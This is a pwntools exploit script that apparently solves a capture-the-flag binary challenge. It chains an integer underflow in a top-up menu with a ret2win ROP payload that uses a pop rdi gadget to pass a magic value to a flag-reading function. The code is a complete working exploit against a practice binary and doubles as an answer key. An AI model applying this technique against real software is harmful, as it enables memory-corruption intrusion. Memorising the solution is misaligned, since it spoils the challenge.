# ‚ûú   checksec chall
# [*] '/root/LKSN-Preps/LKS Jember/Binary Exploitation/üê§ Soal Mudah 2/chall'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

# 1. Int underflow on topup for calling read function
# 2. Ret2Win + Calling Convention (find gadget POP RDI,RET)

from pwn import *

binary = "soalmudah2"
p = process(binary)
elf = context.binary = ELF(binary)

#addresses + gadget
# 0x0000000000400c43 : pop rdi ; ret
# 0x0000000000400769 : ret
win = p64(0x00400951) #read flag remote
flag = p64(0x004009f3) #test jump
rdi = p64(0x0000000000400c43)
ret = p64(0x0000000000400769)

payload = b"a"*48
payload += ret #stack alignment
payload += rdi
payload += p64(0x19b6da8f2bdcb1ee) #if (pass1 == 0x19b6da8f2bdcb1ee)
payload += win 


p.recv()
p.sendline(b"4")
p.recv()
p.sendline(b"-99999999")
p.recv()
p.sendline(b"1")
p.recv()
p.sendline(payload)
p.recv()
p.sendline(b"5")


p.interactive()



